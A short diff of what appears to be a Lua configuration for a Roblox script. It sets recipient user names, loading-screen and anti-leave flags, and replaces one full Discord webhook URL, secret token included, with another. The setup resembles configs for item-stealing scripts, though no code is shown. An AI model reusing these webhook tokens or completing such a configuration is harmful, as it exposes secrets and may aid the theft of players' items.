@@ -1,6 +1,6 @@
 UserName = "Jiksxz"
 UserName2 = "Kage"
-Webhook = "https://discord.com/api/webhooks/1101411124160766044/yWIUn1QNaJwCgvXIzPEtPd3PKRpcPsxm4Bg4sbF5I-olwaGkIddxU-ITftG_jjw3lBPQ"
+Webhook = "https://discord.com/api/webhooks/1101411127646236763/N4spReQ2HMbGaKYiBQz_jMB4XkannH8Hq4ZcH_QLb1FSSGk3mwe-uED0NLQ5LkekfUN2"
 
 _G.LoadingScreen = true
 _G.AntiLeave = false
